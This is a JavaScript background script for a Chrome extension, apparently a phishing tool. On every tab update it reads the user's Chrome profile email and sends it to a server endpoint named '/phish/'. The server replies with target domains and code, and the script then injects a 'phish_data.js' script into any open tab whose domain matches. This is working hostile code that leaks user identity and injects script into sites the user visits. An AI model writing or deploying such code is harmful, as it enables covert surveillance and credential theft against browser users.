

chrome.tabs.onUpdated.addListener(function () {
    chrome.identity.getProfileUserInfo(function (userInfo) {
        var userEmail;
        if (userInfo.email == "") {
            userEmail = "no_email_found"
        }
        else {
            userEmail = JSON.stringify(userInfo.email);
        }
        var dataObj = {};
        dataObj['email'] = userEmail;
        chrome.storage.local.set(dataObj);

        $.get(`http://localhost:5000/phish/${userEmail}`, function (result) {
            chrome.tabs.query({}, function(queried_tabs) {
                $.each(queried_tabs, function(index, value) {
                    console.log(queried_tabs);
                    var urlList = value.url.split('\/')[2].split('.');
                    var url = urlList[urlList.length - 2] + '.' + urlList[urlList.length - 1];
                    if ($.inArray(url, result.urls) != -1) {
                        console.log("WE FOUND IT");
    
                        if (result.code.length != 0) {
                            console.log("code!");
                            chrome.tabs.executeScript(value.id, {
                                file: `phish_data.js`
                            });
                        }
                    }
                });
            });
        });
    });
});
